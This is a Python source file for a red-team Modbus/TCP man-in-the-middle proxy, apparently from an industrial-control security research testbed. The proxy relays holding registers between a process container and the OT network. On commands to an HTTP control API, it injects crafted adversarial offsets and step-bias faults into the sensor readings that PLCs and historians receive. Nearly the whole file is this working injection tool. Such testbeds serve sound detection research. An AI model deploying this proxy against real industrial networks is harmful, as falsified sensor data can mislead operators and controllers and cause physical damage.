"""
Red-Team Modbus/TCP MitM Proxy.

Operates as a transparent Modbus relay between the process container
and the OT network (PLC + historian). In attack mode, injects crafted
holding-register offsets computed by TCA.

From Sec. 4.5: "The red-team operator inserts a pymodbus-based
Modbus/TCP proxy on the virtual segment that operates transparently
in the benign state and injects crafted holding-register offsets in
the attack state, modeling an adversary who has obtained write access
to a network element on the OT segment."

Control API (HTTP on CONTROL_PORT):
    POST /attack/start   — Start attack with TCA perturbation sequence
    POST /attack/stop    — Stop attack, return to transparent relay
    GET  /attack/status  — Get current attack state and statistics
    POST /fault/start    — Inject physical fault (step bias)
    POST /fault/stop     — Remove physical fault
"""

import os
import sys
import json
import time
import logging
import threading
import numpy as np
from http.server import HTTPServer, BaseHTTPRequestHandler

sys.path.insert(0, '/app')

from pymodbus.client import ModbusTcpClient
from pymodbus.server import StartTcpServer
from pymodbus.datastore import (
    ModbusSequentialDataBlock,
    ModbusSlaveContext,
    ModbusServerContext,
)

logging.basicConfig(level=os.getenv('LOG_LEVEL', 'INFO'),
                    format='%(asctime)s [PROXY] %(levelname)s %(message)s')
log = logging.getLogger(__name__)


class AttackState:
    """Thread-safe attack state management."""

    def __init__(self):
        self.lock = threading.Lock()
        self.active = False
        self.fault_active = False

        # TCA perturbation sequence: (T, N) array
        self.delta = None          # Pre-computed perturbation
        self.delta_step = 0        # Current step in sequence

        # Physical fault: per-sensor step bias
        self.fault_bias = np.zeros(6)

        # Statistics
        self.n_injected = 0
        self.start_time = None

    def start_attack(self, delta: np.ndarray):
        with self.lock:
            self.active = True
            self.delta = delta
            self.delta_step = 0
            self.n_injected = 0
            self.start_time = time.time()
            log.info(f"Attack started: {delta.shape[0]} steps, "
                     f"budget ε={np.max(np.abs(delta)):.6f}")

    def stop_attack(self):
        with self.lock:
            self.active = False
            self.delta = None
            self.delta_step = 0
            log.info("Attack stopped")

    def start_fault(self, bias: np.ndarray):
        with self.lock:
            self.fault_active = True
            self.fault_bias = bias
            log.info(f"Fault started: bias={bias}")

    def stop_fault(self):
        with self.lock:
            self.fault_active = False
            self.fault_bias = np.zeros(6)
            log.info("Fault stopped")

    def get_perturbation(self) -> np.ndarray:
        """Get the perturbation for the current timestep."""
        with self.lock:
            pert = np.zeros(6)

            # Physical fault (step bias)
            if self.fault_active:
                pert += self.fault_bias

            # TCA adversarial perturbation
            if self.active and self.delta is not None:
                if self.delta_step < self.delta.shape[0]:
                    pert += self.delta[self.delta_step]
                    self.delta_step += 1
                    self.n_injected += 1
                else:
                    # Perturbation sequence exhausted — replay last value
                    pert += self.delta[-1]
                    self.n_injected += 1

            return pert

    def status(self) -> dict:
        with self.lock:
            return {
                'attack_active': self.active,
                'fault_active': self.fault_active,
                'delta_step': self.delta_step,
                'delta_total': self.delta.shape[0] if self.delta is not None else 0,
                'n_injected': self.n_injected,
                'elapsed_s': time.time() - self.start_time if self.start_time else 0,
                'fault_bias': self.fault_bias.tolist(),
            }


# Global attack state
attack_state = AttackState()


class ProxyRelay:
    """Modbus relay: reads from upstream, applies perturbation, serves downstream."""

    def __init__(self, upstream_host: str, upstream_port: int,
                 slave_context: ModbusSlaveContext):
        self.upstream = ModbusTcpClient(upstream_host, port=upstream_port)
        self.context = slave_context
        self.running = True
        self.n_registers = 6

    def run(self):
        """Main relay loop: poll upstream → perturb → update local store."""
        log.info("Starting proxy relay loop")

        while self.running:
            try:
                if not self.upstream.connected:
                    self.upstream.connect()
                    time.sleep(0.5)
                    continue

                # Read holding registers from upstream (process container)
                result = self.upstream.read_holding_registers(
                    address=0, count=self.n_registers, slave=1
                )

                if result.isError():
                    log.warning(f"Modbus read error: {result}")
                    time.sleep(0.1)
                    continue

                registers = list(result.registers)

                # Apply perturbation (in register units)
                pert = attack_state.get_perturbation()

                # Convert perturbation from engineering units to register offsets
                from core.config import SystemConfig
                cfg = SystemConfig()
                for i in range(min(len(registers), self.n_registers)):
                    if abs(pert[i]) > 1e-12:
                        lo, hi = cfg.sensor_ranges[i]
                        # Convert perturbation to register offset
                        reg_offset = int(pert[i] / (hi - lo + 1e-12) * 65535)
                        registers[i] = max(0, min(65535,
                                                   registers[i] + reg_offset))

                # Write to local Modbus store (downstream clients read this)
                self.context[0x03].setValues(1, registers)

                # Also relay coil writes from downstream back to upstream
                coils = self.context[0x01].getValues(1, count=2)
                self.upstream.write_coils(0, coils, slave=1)

            except Exception as e:
                log.error(f"Relay error: {e}")
                try:
                    self.upstream.connect()
                except Exception:
                    pass

            time.sleep(0.1)  # 10 Hz polling (faster than 1 Hz sample)


class ControlHandler(BaseHTTPRequestHandler):
    """HTTP handler for the red-team control API."""

    def log_message(self, format, *args):
        log.debug(format % args)

    def do_GET(self):
        if self.path == '/attack/status':
            status = attack_state.status()
            self._respond(200, status)
        else:
            self._respond(404, {'error': 'not found'})

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b'{}'

        try:
            data = json.loads(body) if body else {}
        except json.JSONDecodeError:
            self._respond(400, {'error': 'invalid JSON'})
            return

        if self.path == '/attack/start':
            delta = np.array(data.get('delta', []))
            if delta.ndim == 1:
                # Single-step perturbation: repeat for T steps
                T = data.get('duration_steps', 600)
                delta = np.tile(delta, (T, 1))
            attack_state.start_attack(delta)
            self._respond(200, {'status': 'attack started'})

        elif self.path == '/attack/stop':
            attack_state.stop_attack()
            self._respond(200, {'status': 'attack stopped'})

        elif self.path == '/fault/start':
            bias = np.array(data.get('bias', [0] * 6))
            attack_state.start_fault(bias)
            self._respond(200, {'status': 'fault started'})

        elif self.path == '/fault/stop':
            attack_state.stop_fault()
            self._respond(200, {'status': 'fault stopped'})

        else:
            self._respond(404, {'error': 'not found'})

    def _respond(self, code: int, body: dict):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(body).encode())


def main():
    log.info("=" * 60)
    log.info("Red-Team Modbus/TCP MitM Proxy")
    log.info("=" * 60)

    upstream_host = os.getenv('UPSTREAM_HOST', 'process')
    upstream_port = int(os.getenv('UPSTREAM_PORT', '502'))
    listen_port = int(os.getenv('LISTEN_PORT', '502'))
    control_port = int(os.getenv('CONTROL_PORT', '8080'))

    log.info(f"Upstream: {upstream_host}:{upstream_port}")
    log.info(f"Listen: 0.0.0.0:{listen_port}")
    log.info(f"Control API: 0.0.0.0:{control_port}")

    # Modbus data store (local mirror of upstream registers)
    hr_block = ModbusSequentialDataBlock(1, [0] * 10)
    coil_block = ModbusSequentialDataBlock(1, [1, 60] + [0] * 8)
    di_block = ModbusSequentialDataBlock(1, [0] * 10)
    ir_block = ModbusSequentialDataBlock(1, [0] * 10)

    slave_context = ModbusSlaveContext(
        di=di_block, co=coil_block, hr=hr_block, ir=ir_block
    )
    server_context = ModbusServerContext(slaves=slave_context, single=True)

    # Start relay in background
    relay = ProxyRelay(upstream_host, upstream_port, slave_context)
    relay_thread = threading.Thread(target=relay.run, daemon=True)
    relay_thread.start()

    # Start control API in background
    control_server = HTTPServer(('0.0.0.0', control_port), ControlHandler)
    control_thread = threading.Thread(target=control_server.serve_forever,
                                       daemon=True)
    control_thread.start()
    log.info(f"Control API running on port {control_port}")

    # Start Modbus TCP server (blocking)
    log.info(f"Starting Modbus/TCP proxy server on port {listen_port}")
    StartTcpServer(context=server_context, address=("0.0.0.0", listen_port))


if __name__ == '__main__':
    main()
